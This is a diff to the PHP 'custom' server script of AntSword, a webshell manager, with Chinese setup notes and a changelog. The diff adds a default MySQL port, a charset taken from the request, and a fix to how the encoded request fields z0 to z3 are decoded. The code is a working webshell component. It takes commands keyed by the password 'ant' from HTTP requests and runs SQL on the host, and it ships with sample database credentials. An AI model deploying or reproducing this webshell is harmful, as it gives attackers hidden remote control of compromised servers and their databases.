@@ -17,13 +17,20 @@
 *  1. AntSword >= v2.0.7
 *  2. 创建 Shell 时选择 custom 模式连接
 *  3. 数据库连接：
-*    <H>localhost</H>
+*    <H>localhost:3306</H>
 *    <U>root</U>
 *    <P>123456</P>
 *
 *  4. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
 *
 * ChangeLog:
+*	Data: 2021/02/24 v1.5
+*    1. 修复 5.2.* 版本语法不兼容问题
+*
+*   Date: 2020/03/26 v1.4
+*    1. 修复由于decode函数与EC函数位置写反而导致的乱码问题
+*    2. 增加动态修改字符编码接口
+*
 *   Date: 2019/05/22 v1.3
 *    1. 支持 mysqli 连接非默认端口
 *
@@ -45,7 +52,8 @@ $pwd = "ant"; //连接密码
 $encoder = ""; // default
 // $encoder = "base64"; //base64
 // $encoder = "hex"; // hex
-$cs = "UTF-8";
+//$cs = "UTF-8";
+$cs=isset($_REQUEST['charset'])?$_REQUEST['charset']:"UTF-8";
 
 /**
 * 字符编码处理
@@ -121,7 +129,7 @@ function executeSQL($encode, $conf, $sql, $columnsep, $rowsep, $needcoluname){
     $conf = (EC($conf));
 
     /*
-    <H>localhost</H>
+    <H>localhost:3306</H>
     <U>root</U>
     <P>root</P>
     */
@@ -138,8 +146,8 @@ function executeSQL($encode, $conf, $sql, $columnsep, $rowsep, $needcoluname){
         $password = $data[1];    
     }
     $encode = decode(EC($encode));
-    $port=split(":",$host)[1];
-    $host=split(":",$host)[0];
+	list($host, $port) = split(":", $host);
+	$port == "" ? $port = "3306" : $port;
     $conn = @mysqli_connect($host, $user, $password, "", $port);
     $res = @mysqli_query($conn, $sql);
     if (is_bool($res)) {
@@ -377,10 +385,10 @@ function listcmd($binarr){
 @set_magic_quotes_runtime(0);
 
 $funccode = EC($_REQUEST[$pwd]);
-$z0 = decode(EC($_REQUEST['z0']));
-$z1 = decode(EC($_REQUEST['z1']));
-$z2 = decode(EC($_REQUEST['z2']));
-$z3 = decode(EC($_REQUEST['z3']));
+$z0 = EC(decode($_REQUEST['z0']));
+$z1 = EC(decode($_REQUEST['z1']));
+$z2 = EC(decode($_REQUEST['z2']));
+$z3 = EC(decode($_REQUEST['z3']));
 
 // echo "<meta HTTP-EQUIV=\"csontent-type\" content=\"text/html; charset={$cs}\">";
 echo "->"."|";
